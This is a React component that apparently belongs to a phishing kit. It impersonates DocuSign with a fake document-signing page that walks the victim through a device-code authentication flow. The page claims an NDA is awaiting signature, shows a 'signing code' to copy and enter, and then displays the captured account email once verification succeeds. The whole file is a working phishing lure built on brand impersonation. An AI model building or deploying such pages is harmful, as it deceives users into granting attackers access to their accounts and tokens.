import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function DocuSignSplitTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow();

  return (
    <div className="tpl-page" style={{ background: '#eee' }}>
      <div className="tpl-split-container">
        <div className="tpl-split-left" style={{ background: 'linear-gradient(135deg, #3F3B9B 0%, #2c2878 100%)' }}>
          <svg width="140" height="32" viewBox="0 0 140 32"><text x="0" y="24" fill="white" fontSize="24" fontWeight="700" fontFamily="Arial">DocuSign</text></svg>
          <h2>Sign Documents Securely</h2>
          <p>Complete your document signing with enterprise-grade security and compliance.</p>
          <div className="tpl-split-features">
            <div className="tpl-split-feature"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg> Bank-level encryption</div>
            <div className="tpl-split-feature"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg> Legally binding signatures</div>
            <div className="tpl-split-feature"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg> Audit trail included</div>
          </div>
        </div>
        <div className="tpl-split-right">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Sign Your Document</h1>
              <p className="tpl-text">A document has been sent to you for signing. Verify your identity to proceed.</p>
              <div className="tpl-info-box" style={{ background: '#f0eef9', borderColor: '#c5c2e8', color: '#3F3B9B' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3F3B9B" strokeWidth="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                <span>NDA_Agreement.pdf — Awaiting your signature</span>
              </div>
              <button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleStart}>Begin Verification</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Preparing document...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Your Code</h1>
              <p className="tpl-text">Use this code to verify your identity.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">SIGNING CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the code</div><div className="tpl-step">2. Click verify and enter it</div></div>
              <button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Verified</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">Document is ready for signing.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Sign another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
      </div>
    </div>
  );
}
